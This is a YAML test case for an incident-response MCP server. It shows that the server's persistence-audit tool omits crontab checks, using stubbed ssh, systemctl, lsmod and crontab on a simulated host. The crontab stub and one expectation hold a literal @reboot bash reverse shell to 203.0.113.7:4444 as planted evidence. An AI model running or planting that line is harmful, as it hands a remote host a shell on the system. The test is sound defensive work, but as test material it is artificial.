@@ -1,0 +1,140 @@
+# Matrix case P2049-151: live_persistence_audit says it sweeps systemd
+# services, timers, crontabs, /etc/rc.local, /etc/profile.d, ~/.bashrc tails
+# and kernel modules, but its fixed remote command has no crontab or
+# /etc/cron* part at all (live_scheduled_tasks has one).
+# The live host is simulated: ${STUBS}/ssh drops the ssh options and
+# user@host and runs the remote command line locally, as the remote shell
+# would. On that "host", systemctl, lsmod and crontab are stubs printing what
+# the real tools print (systemctl --plain list formats, lsmod's table, a
+# crontab -l listing); sudo is a stub that drops -n and runs the command.
+# root's crontab has an @reboot reverse-shell entry, the most common Linux
+# cron persistence.
+case_id: P2049-151
+problem: P2049
+server: trudi
+variant: trudi-88fbca7
+commit: 88fbca78186b6a0ca40423cf5e37a9dc46ae051e
+display: multi-call
+level: mcp
+realism: common
+realism_ko: "crontab의 @reboot 항목은 리눅스 침해에서 가장 흔한 지속성 수단이고, 지속성 한 번 훑기 도구로 먼저 보는 것도 자연스럽다."
+coverage: "partial: the live host is simulated (ssh, systemctl, lsmod, crontab are stubs in their real output formats, and files such as /etc/profile.d are the container's own); the lsmod | head -50 cut is not shown"
+coverage_ko: "실제 원격 호스트가 아니라 흉내 낸 호스트다(ssh, systemctl, lsmod, crontab은 실제 출력 형식을 따른 대역이고 /etc/profile.d 같은 파일은 컨테이너 자체의 것이다). `lsmod | head -50` 잘림은 보이지 않았다"
+summary: On a host whose root crontab has an @reboot reverse shell, live_persistence_audit returns success with systemd, timer, rc.local, profile.d, .bashrc and lsmod sections but no crontab section, while live_scheduled_tasks on the same host shows the @reboot entry.
+summary_ko: "root crontab에 @reboot 리버스 셸이 있는 호스트에서 `live_persistence_audit`는 systemd·타이머·rc.local·profile.d·.bashrc·lsmod 구역만 있고 crontab 구역이 없는 성공 응답을 준다. 같은 호스트에서 `live_scheduled_tasks`는 그 @reboot 항목을 보여 준다."
+defect_ko: "이 서버의 지속성 훑기 명령에는 crontab과 /etc/cron*을 읽는 부분이 없다. 설명대로라면 crontab도 훑어 결과에 담아야 한다. 모델은 이 호스트에 cron 지속성이 없다고 잘못 안다."
+setup_ko: "원격 호스트를 흉내 내고, root crontab에 `@reboot` 리버스 셸 항목을 넣었다."
+env:
+  TRUDI_CACHE_DIR: ${DB_DIR}/cache
+  TRUDI_LIVE_HOSTS_CONFIG: ${DB_DIR}/live_hosts.json
+  PATH: ${STUBS}:${PATH}
+stubs:
+  - name: ssh
+    text: |
+      #!/bin/sh
+      # Stand-in for ssh to the registered live host: skip the options and
+      # user@host up to "--", then run the remote command line (already
+      # shell-quoted by trudi) the way the remote shell would.
+      while [ $# -gt 0 ]; do
+        if [ "$1" = "--" ]; then shift; break; fi
+        shift
+      done
+      exec sh -c "$*"
+  - name: sudo
+    text: |
+      #!/bin/sh
+      # Stand-in for passwordless sudo on the host: drop -n, run the command.
+      [ "$1" = "-n" ] && shift
+      exec "$@"
+  - name: systemctl
+    text: |
+      #!/bin/sh
+      # Stub of systemctl with --plain --no-pager output (systemd 249).
+      case "$1" in
+        list-unit-files)
+          cat <<'OUT'
+      UNIT FILE                 STATE   VENDOR PRESET
+      cron.service              enabled enabled
+      ssh.service               enabled enabled
+      rsyslog.service           enabled enabled
+      systemd-timesyncd.service enabled enabled
+
+      4 unit files listed.
+      OUT
+          ;;
+        list-timers)
+          cat <<'OUT'
+      NEXT                        LEFT          LAST                        PASSED       UNIT                         ACTIVATES
+      Tue 2024-10-29 00:00:00 UTC 14h left      Mon 2024-10-28 00:00:00 UTC 9h ago       logrotate.timer              logrotate.service
+      Tue 2024-10-29 06:12:44 UTC 20h left      Mon 2024-10-28 06:40:10 UTC 3h ago       apt-daily-upgrade.timer      apt-daily-upgrade.service
+
+      2 timers listed.
+      Pass --all to see loaded but inactive timers, too.
+      OUT
+          ;;
+        *) echo "Unknown command verb $1." >&2; exit 1 ;;
+      esac
+  - name: lsmod
+    text: |
+      #!/bin/sh
+      # Stub of lsmod (kmod): the /proc/modules table.
+      cat <<'OUT'
+      Module                  Size  Used by
+      tls                   114688  0
+      nls_iso8859_1          16384  1
+      ext4                  966656  1
+      mbcache                16384  1 ext4
+      jbd2                  167936  1 ext4
+      virtio_net             61440  0
+      OUT
+  - name: crontab
+    text: |
+      #!/bin/sh
+      # Stub of crontab -u <user> -l: root has one entry, others none
+      # ("no crontab for <user>" on stderr, exit 1, as cron prints it).
+      if [ "$1" = "-u" ] && [ "$2" = "root" ] && [ "$3" = "-l" ]; then
+        cat <<'OUT'
+      # m h  dom mon dow   command
+      @reboot /bin/bash -c 'sleep 30; bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'
+      OUT
+        exit 0
+      fi
+      echo "no crontab for $2" >&2
+      exit 1
+fixture:
+  - path: live_hosts.json
+    root: db
+    text: |
+      {"web01": {"user": "trudi", "host": "198.51.100.20", "identity": "~/.ssh/trudi_live", "port": 22}}
+  - path: case01/analysis/.keep
+    root: outside
+    text: ""
+steps:
+  - tool: misc_start_execution_log
+    note_ko: "준비: 사건 기록을 연다"
+    args:
+      case_id: CASE-001
+      output_path: ${OUTSIDE}/case01/analysis/trace.json
+      case_dir: ${OUTSIDE}/case01
+      launch_dashboard: false
+  - tool: live_persistence_audit
+    note_ko: "결함 호출: 지속성을 한 번에 훑음"
+    args:
+      host: web01
+  - tool: live_scheduled_tasks
+    note_ko: "비교 호출: 같은 호스트의 예약 작업을 봄"
+    args:
+      host: web01
+expect:
+  - step: 2
+    note_ko: "지속성 훑기는 성공 응답이다"
+    contains: '"success": true'
+  - step: 2
+    note_ko: "응답 구역은 systemd 다음에 바로 rc.local·profile.d·.bashrc·lsmod로 이어지고 crontab 구역이 없다"
+    regex: "===SYSTEMD_TIMERS===.*===RC_LOCAL===.*===PROFILE_D===.*===BASHRC_TAIL===.*===LSMOD==="
+  - step: 2
+    note_ko: "지속성 훑기 명령에 crontab이나 cron 경로가 없다"
+    not_regex: "(?i)cron(tab|\\.d|\\.daily|_d)"
+  - step: 3
+    note_ko: "같은 호스트의 예약 작업에는 root의 @reboot 리버스 셸이 있다"
+    contains: "@reboot /bin/bash -c 'sleep 30; bash -i >& /dev/tcp/203.0.113.7/4444 0>&1'"
